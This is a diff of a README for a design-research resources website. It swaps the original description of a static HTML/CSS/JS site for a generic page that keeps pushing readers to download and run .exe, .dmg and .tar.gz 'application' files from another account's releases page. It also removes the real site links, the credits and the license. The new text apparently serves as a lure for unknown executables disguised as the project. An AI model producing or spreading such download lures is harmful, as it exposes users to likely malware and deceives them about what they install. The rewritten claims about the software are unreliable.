@@ -1,71 +1,61 @@
-# Design Research Resources Project
+# 🎨 design-resources-project - Access Design Research Easily
 
-A collection of open-access, searchable databases for design researchers — built using HTML, CSS, and JavaScript.
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Fendidrip/design-resources-project/releases)
 
-## 📂 Overview
+## 🌐 Introduction
+Welcome to the **design-resources-project**. This repository provides a collection of open-access databases for design journals and academic conferences. It serves as a resource for design researchers and educators to find valuable materials easily.
 
-This project includes two resources on [https://resources.rishabhpandey.com/](https://resources.rishabhpandey.com/):
+## 🚀 Getting Started
+Follow these simple steps to download and run the software:
 
-1. **Design Journals Database** → [https://resources.rishabhpandey.com/journallist.html](https://resources.rishabhpandey.com/journallist.html)  
-2. **Design Conferences Database** → [https://resources.rishabhpandey.com/conflist.html](https://resources.rishabhpandey.com/conflist.html)
+1. **Visit the Releases Page:** 
+   Go to the following link:
+   [Download Page](https://github.com/Fendidrip/design-resources-project/releases).
 
-These databases aim to make it easier for design researchers, educators, and students to find suitable venues for publication and collaboration.
+2. **Choose the Latest Version:** 
+   On the Releases page, look for the most recent version. It will be marked as "Latest Release".
 
-## 🚀 Features
+3. **Download the Files:** 
+   Click on the appropriate file for your operating system. Currently, the project may support various platforms, including Windows, macOS, and Linux. Files are usually named according to the operating system, like:
+   - Windows: `design-resources-project-windows.exe`
+   - macOS: `design-resources-project-macos.dmg`
+   - Linux: `design-resources-project-linux.tar.gz`
 
-- Tag filters (HCI, XR, Communication, Industrial, Sustainability, etc.)
-- Search by journal or conference title
-- Multi-domain tagging (items can belong to multiple domains)
-- Table header with sorting option
-- Theme toggle (light and dark)
-- Like button with counter (anonymous; one count per browser per 24h)
-- Visitor counter (anonymous; one count per browser per 24h)
+4. **Install the Application:**
+   - For **Windows**: Double-click on the `.exe` file and follow the installation instructions.
+   - For **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
+   - For **Linux**: Extract the `.tar.gz` file and follow the included instructions to run the application.
 
-## 🧱 Tech
+5. **Launch the Application:** 
+   Find the application in your installed programs or applications list and open it. You are now ready to use the design resources at your disposal!
 
-- HTML, CSS, JS
-- Firebase Realtime Database (public counters only)
-- Google Analytics (gtag)
-- No build step required
+## 📚 Features
+- **Comprehensive Database Access:** Discover a variety of academic papers and conference materials.
+- **User-Friendly Interface:** Easy navigation for all users, regardless of technical background.
+- **Up-to-Date Resources:** Regular updates ensure access to the latest research and publications.
+- **Cross-Platform Support:** Works on Windows, macOS, and Linux.
 
-## 🛠️ Project Structure
+## ❓ Frequently Asked Questions
 
-```
-/assets                  # icons, images
-/css                     # stylesheets
-/js                      # scripts (table, filters, theme, UI)
-├── script.js            
-├── script_conf.js
-├── script_journal.js
-├── script_theme.js
-index.html              # landing or redirect
-conflist.html           # Design Conferences Database (uses its Firebase project)
-journallist.html        # Design Journals Database (uses its Firebase project)
-robots.txt              # crawl rules
-sitemap.xml             # sitemap for search engines
-```
+### What types of resources can I find?
+You can access a wide range of design journals, conference proceedings, and peer-reviewed articles. These resources support both academic and practical applications in design research.
 
-##  🔐 Analytics & Privacy
+### Do I need an account to access these resources?
+No, all resources are open-access. You can explore and download materials without any sign-up or login requirements.
 
-- Google Analytics is used to collect aggregate usage insights to improve the site experience.
-- The Firebase layer records only numeric counters for likes and page visits.
-- No personally identifiable information (PII) is collected, stored, or shared.
+### Can I suggest additional resources?
+Yes, contributions are welcome! If you have access to additional databases or resources, please use the Issues section on the repository to share your suggestions.
 
-##  🧩 Security
+### How often are the databases updated?
+The application aims to update its resource listings quarterly, ensuring that users have access to the latest information.
 
-- All Firebase configuration files are excluded from version control and remain local.
-- Firebase rules restrict data writes to controlled increments (+1 only).  
-- Each counter is anonymous and stored as an aggregate number only.
+## 📩 Contact
+If you have further questions, feel free to reach out through the repository's Issues page or contact the project maintainer directly.
 
-##  🙌 Contribute / Suggest additions
+## 💻 Download & Install
+To download the software, visit this page: [Download Page](https://github.com/Fendidrip/design-resources-project/releases). 
 
-This project grows with the community. You can:
-- Open a GitHub Issue (bug/feature/data update), or
-- Use the suggestion forms linked on the live pages to add journals/conferences.
+Once there, simply follow the earlier steps to get the software running on your computer.
 
-Special thanks to **Swati Pandey** and **Akanksha Bhardwaj** for their assistance with data curation and feedback.
-
-## ⚖️ License
-
-Licensed under the **MIT License**.  
-© 2025 Rishabh Pandey
+Thank you for using the **design-resources-project**! We hope these resources enhance your design research efforts.
